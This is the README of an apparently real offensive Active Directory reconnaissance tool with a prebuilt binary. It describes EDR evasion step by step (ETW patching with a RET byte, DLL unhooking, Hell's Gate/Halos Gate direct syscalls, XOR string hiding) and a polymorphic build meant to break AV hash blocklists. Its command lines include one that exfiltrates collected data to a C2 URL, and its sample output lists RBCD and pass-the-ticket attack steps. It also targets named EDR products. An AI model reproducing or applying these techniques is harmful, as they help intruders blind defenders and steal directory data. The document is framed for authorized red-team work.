# AD-Necromancer V2

> **"Humans forget. Directories do not."**

A self-contained, EDR-evasive Active Directory privilege archaeology engine.  
V2 **no longer requires SharpHound** — it collects directly from AD, encrypts the output, and feeds it into the AI analysis engine. One binary. Zero dependencies.

---

## ⚡ What's New in V2

| Feature | V1 | V2 |
|---|---|---|
| Data collection | Requires pre-run SharpHound | **Live ADWS / LDAP built-in** |
| EDR evasion | None | **ETW patch, DLL unhooking, Hell's Gate syscalls, XOR obfuscation** |
| Output | Console only | **AES-256-GCM encrypted zip + optional HTTPS C2 exfil** |
| BH format | Import JSONs manually | **Auto-generates BloodHound CE v6 JSON** |
| Binary hash | Static | **Polymorphic: different SHA256 on every build** |
| Privacy Cloak | ✅ | ✅ (preserved) |
| AI Analysis | ✅ | ✅ (now via `--analyze` flag) |

---

## 🔥 V2 Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                     AD-Necromancer V2                       │
│                                                             │
│  ┌────────────────┐    ┌─────────────────────────────────┐ │
│  │  EDR Evasion   │    │       Collection Engine          │ │
│  │   Bootstrap    │    │  ADWS (9389) ──► LDAP (389/636) │ │
│  │                │    │  Auto-detect · Stealth jitter    │ │
│  │ • ETW patch    │    └───────────────┬─────────────────┘ │
│  │ • DLL unhook   │                    │                    │
│  │ • Hell's Gate  │    ┌───────────────▼─────────────────┐ │
│  │ • XOR strings  │    │        Output Pipeline           │ │
│  └────────────────┘    │  BH CE v6 JSON → AES-256-GCM    │ │
│                        │  Encrypted ZIP → Local / C2      │ │
│                        └───────────────┬─────────────────┘ │
│                                        │                    │
│                        ┌───────────────▼─────────────────┐ │
│                        │      AI Necromancy Engine        │ │
│                        │  Privilege Archaeology (--analyze)│ │
│                        │  Privacy Cloak · Multi-provider  │ │
│                        └─────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

---

## 🚀 Quick Start

### Option A — Use the pre-built binary (no Go required)

Download `ad-necromancer-v2.exe` from this repo and run it directly:

```powershell
# Live collection (auto ADWS → LDAP fallback)
.\ad-necromancer-v2.exe -u jdoe -d corp.local -p P@ssw0rd

# Full stealth mode + C2 exfil
.\ad-necromancer-v2.exe -u jdoe -d corp.local -p P@ssw0rd --stealth --exfil https://c2.example.com/upload

# Live collect + AI analysis in one run
.\ad-necromancer-v2.exe -u jdoe -d corp.local -p P@ssw0rd --analyze --claude

# Offline mode — analyze existing BloodHound JSONs (V1 behavior)
.\ad-necromancer-v2.exe --data C:\path\to\jsons --analyze
```

### Option B — Polymorphic build from source

```powershell
# Requires Go 1.21+
git clone https://github.com/0xSense1/AD-Necromancer.git
cd AD-Necromancer

# Builds with garble + random UUID + phantom pad — new hash every time
.\build.ps1
```

---

## 📋 All Flags

### Collection (V2 — Live Mode)

| Flag | Default | Description |
|---|---|---|
| `-u, --username` | — | AD username |
| `-d, --domain` | — | Domain FQDN (e.g. `corp.local`) |
| `-p, --password` | — | Password |
| `--dc` | auto-discover | Specific DC hostname/IP |
| `--method` | `auto` | `adws` \| `ldap` \| `auto` |

### Output

| Flag | Default | Description |
|---|---|---|
| `--local` | `true` | Save `adn_data.zip` to disk |
| `--exfil` | — | HTTPS C2 URL to POST the encrypted zip |

### Analysis (AI Engine)

| Flag | Default | Description |
|---|---|---|
| `--analyze` | `false` | Run AI privilege archaeology on collected data |
| `--data` | — | Offline mode: path to BloodHound JSON directory |
| `--claude` | — | Use Anthropic Claude backend |
| `--gemini` | — | Use Google Gemini backend |
| `--openai` | — | Use OpenAI backend |
| `--on-premise` | — | Use local Ollama backend |
| `--sample-size` | `20` | Max entities per type sent to AI |

### Evasion

| Flag | Default | Description |
|---|---|---|
| `--stealth` | `false` | Enable max evasion: jitter, no console output, all ops silent |
| `--no-unhook` | `false` | Disable DLL unhooking (debug) |
| `--no-etw-patch` | `false` | Disable ETW patching (debug) |

### Privacy

| Flag | Default | Description |
|---|---|---|
| `--no-privacy-cloak` | `false` | Send real data to remote AI (not recommended) |
| `--save-mapping` | `false` | Save tokenization mapping to disk |
| `--debug` | `false` | Show AI payload to verify Privacy Cloak |

---

## 🛡️ EDR Evasion — How It Works

### 1. XOR String Obfuscation (`internal/evasion/strings.go`)
Every sensitive string — DLL names, `LDAP`, `ADWS`, `9389`, `EtwEventWrite`, API function names — is stored as pre-XOR'd byte literals in source. The plaintext never appears in the binary's string table.

### 2. PEB Walker (`internal/evasion/peb.go` + `peb_amd64.s`)
Module enumeration via `GS:[0x60]` (PEB pointer, Plan 9 assembly) → `PEB_LDR_DATA` → `InLoadOrderModuleList`. Finds loaded DLLs without ever calling `GetModuleHandle` or `LoadLibrary`.

### 3. EDR DLL Unhooking (`internal/evasion/unhook.go`)
1. Locate hooked DLL in memory via PEB walk
2. Read clean `.text` section from `C:\Windows\System32\<dll>.dll`
3. Make `.text` writable via `NtProtectVirtualMemory` direct syscall
4. `copy()` clean bytes over hooked bytes → hooks removed
5. Restore original page protection

Targets: `ntdll.dll`, `kernelbase.dll`, and any DLL matching EDR name patterns (`csfalcon`, `sentinel`, `edr`, `mde`, `elastic`, `cylance`, `cbdll`).

### 4. ETW Patching (`internal/evasion/etw.go`)
Writes `0xC3` (RET) to the first byte of `EtwEventWrite`, `EtwEventWriteFull`, and `NtTraceEvent` via direct syscall. Kills most user-mode telemetry before any collection begins.

### 5. Hell's Gate + Halos Gate (`internal/evasion/syscall.go` + `peb_amd64.s`)
- Walks the ntdll export table at runtime to extract syscall service numbers (SSNs) from `Nt*` function stubs
- If a stub is hooked (`JMP` at offset 0), scans neighbouring stubs to recover the correct SSN (Halos Gate)
- Invokes `SYSCALL` directly via a Plan 9 assembly stub — no call through ntdll at all

---

## 🔑 Encrypted Output

Every run produces `adn_data.zip`:
- In-memory zip of BloodHound CE v6 JSON files
- AES-256-GCM encrypted (random 32-byte key per run)
- Key printed to console on exit (or suppressed in `--stealth` mode)

```powershell
[+] Saved: adn_data.zip (AES-256-GCM encrypted)
[🔑] Decryption key: 3f8a2c1d9b4e7f0a6c5d2e8b1a4f7c3d9e2b5a8c1d4f7e0b3a6c9d2e5f8b1a4
```

Import `adn_data.zip` directly into BloodHound CE — it accepts the zip format natively.

---

## 🔒 Privacy Cloak

When using remote AI backends, Privacy Cloak tokenizes all sensitive AD identifiers before they leave your machine. The AI never sees real names.

```
"T1_TONYMONTANA@PHANTOM.CORP" → "ID_U_42B1"
"DOMAIN ADMINS@PHANTOM.CORP"  → "ID_G_9A22"
"DC01.PHANTOM.CORP"           → "H_T0_19C2"
```

| Scenario | Privacy Cloak |
|---|---|
| Remote AI (default) | ✅ ON |
| On-premise Ollama | ⚪ OFF |
| `--no-privacy-cloak` | ❌ Disabled |

Token types: `DOM_`, `ID_U_`, `ID_G_`, `H_T0_`, `H_T1_`, `H_`, `OU_`, `GPO_`, `SID_`, `TMPL_`, `CA_`

---

## ♻️ Polymorphic Build System

Every invocation of `build.ps1` produces a **different binary hash**:

```powershell
.\build.ps1
# SHA-256: F5BBA9CBB718604CFA427A1C6991478197600FB31F2B4F5238A5B5E518F059BA

.\build.ps1
# SHA-256: D3E7693F8BA0AA929F2E101A03F33E09C389A32474D183318DD36AA4B35B7DD4
```

**Three layers:**

| Layer | Technique | Effect |
|---|---|---|
| 1 | `garble -seed=random -literals -tiny` | Randomizes function names, symbol table, string encoding |
| 2 | `-ldflags -X phantom.BuildID=<UUID v4>` | Unique 36-char string embedded in binary per compile |
| 3 | `gen_phantom.go` regenerates `phantom.go` with 256 new random bytes | Mutates `.data` section |

Breaks hash-based EDR/AV blocklists that trigger before behavioral analysis.

---

## 🔧 Setup — AI Backend (for `--analyze`)

Set the appropriate environment variable before running:

```powershell
# DeepSeek (default)
$env:DEEPSEEK_API_KEY="your-key"

# Anthropic Claude
$env:CLAUDE_API_KEY="your-key"
$env:CLAUDE_MODEL="claude-3-5-sonnet-20241022"  # optional

# OpenAI
$env:OPENAI_API_KEY="your-key"
$env:OPENAI_MODEL="gpt-4o-mini"  # optional

# Google Gemini
$env:GEMINI_API_KEY="your-key"
$env:GEMINI_MODEL="gemini-1.5-flash"  # optional

# Ollama (local — no key needed)
$env:OLLAMA_ENDPOINT="http://localhost:11434"  # optional, default
$env:OLLAMA_MODEL="llama3"  # optional, default
```

**AI backend priority** (if multiple flags set): Ollama > Claude > Gemini > OpenAI > DeepSeek

---

## 📊 Sample AI Analysis Output

```
╔══════════════════════════════════════════════════════════════════════════════╗
║ ☠  CRITICAL — RBCD Residue on Decommissioned Test System                    ║
╚══════════════════════════════════════════════════════════════════════════════╝

[ENTITY] JONAS-TEST-MS01.PHANTOM.CORP (Computer)

[SECURITY INTERPRETATION]
  ▸ This computer has AddAllowedToAct granted to user S-1-5-21-...-2132
  ▸ Enables RBCD attacks — attacker can impersonate any user to any service
  ▸ Forgotten config from decommissioned test project, last touched 892 days ago

[UNDEAD CONTROL PATH]
         🟣 User S-1-5-21-...-2132
                │ AddAllowedToAct
                ▼
         🔴 JONAS-TEST-MS01 (RBCD)
                ▼
         🔴 Domain Compromise

[EXECUTION VECTORS]
  • Set SPN on controlled account → rbcd.py → impersonate DA
  • getST.py -spn cifs/JONAS-TEST-MS01 → pass-the-ticket

[MITIGATION]
  Remove AddAllowedToAct from JONAS-TEST-MS01.
  Audit all RBCD configurations. Enable RBCD change alerts in SIEM.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

## 🗂️ Project Structure

```
ad-necromancer/
├── cmd/ad-necromancer/main.go      ← V2 entry point
├── build.ps1                       ← Polymorphic build script
├── ad-necromancer-v2.exe           ← Pre-built release binary
├── internal/
│   ├── evasion/                    ← EDR evasion layer
│   │   ├── strings.go              ← XOR obfuscation
│   │   ├── peb.go                  ← PEB walker
│   │   ├── peb_amd64.s             ← gs:[0x60] + direct SYSCALL stubs
│   │   ├── syscall.go              ← Hell's Gate / Halos Gate
│   │   ├── unhook.go               ← EDR DLL unhoooker
│   │   └── etw.go                  ← ETW patcher
│   ├── adws/client.go              ← ADWS WS-Enumeration SOAP client
│   ├── ldap/                       ← LDAP client + collector
│   ├── collector/collector.go      ← Auto-select ADWS / LDAP
│   ├── bh/                         ← BloodHound CE v6 formatter
│   ├── crypto/aes.go               ← AES-256-GCM encrypted zip
│   ├── exfil/exfil.go              ← Local save + HTTPS C2 upload
│   ├── phantom/                    ← Polymorphic padding + BuildID
│   ├── necromancy/engine.go        ← AI analysis engine (V1)
│   ├── privacy/                    ← Privacy Cloak tokenizer (V1)
│   └── prompts/prompts.go          ← System prompt (V1)
```

---

## ⚠️ Legal Disclaimer

AD-Necromancer is an **offensive security research tool** intended exclusively for:
- Authorized penetration testing engagements
- Red team operations with written permission
- Security research in controlled lab environments
- Academic and conference demonstrations (e.g. DEFCON)

**Unauthorized use against systems you do not own or have explicit permission to test is illegal.** The authors assume no liability for misuse.

---

## 📝 License

MIT